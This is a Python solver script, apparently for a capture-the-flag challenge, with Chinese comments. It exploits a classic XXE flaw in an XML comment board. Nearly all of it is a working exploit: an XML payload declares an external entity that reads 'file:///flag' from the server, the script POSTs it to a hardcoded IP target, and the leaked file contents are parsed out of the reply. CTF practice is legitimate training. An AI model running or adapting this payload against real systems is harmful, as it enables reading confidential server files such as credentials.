#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
27-xxe-classic-read  自动化解题脚本
题目：XML Comment Board (POST / 提交 XML，回显 <name>)
漏洞：经典 XXE —— 外部通用实体 file:// 读取 /flag
用法：python3 main.py [URL]
"""
import sys
import re
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://47.120.76.57:34935/"

PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<comment><name>&x;</name><content>c</content></comment>'''

def exploit(url: str) -> str:
    req = urllib.request.Request(
        url,
        data=PAYLOAD.encode(),
        headers={"Content-Type": "application/xml"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    return body

def main():
    print(f"[*] Target : {TARGET}")
    print(f"[*] Payload:\n{PAYLOAD}\n")
    body = exploit(TARGET)
    print("[*] Raw Response:")
    print(body)

    # 从 "Thanks, XXX!" 中提取 flag
    m = re.search(r"Thanks,\s*(.+?)\s*!?</h2>", body, re.S)
    if m:
        leaked = m.group(1).strip()
        print("\n[+] Leaked content:")
        print(leaked)
        flag = re.search(r"(TOGOGO-flag\{[^}]+\})", leaked)
        if flag:
            print(f"\n[🚩] FLAG = {flag.group(1)}")
        else:
            print("\n[!] 未匹配到 TOGOGO-flag{...}，请人工检查上方输出")
    else:
        print("\n[!] 未找到回显点，请检查目标是否存活")

if __name__ == "__main__":
    main()
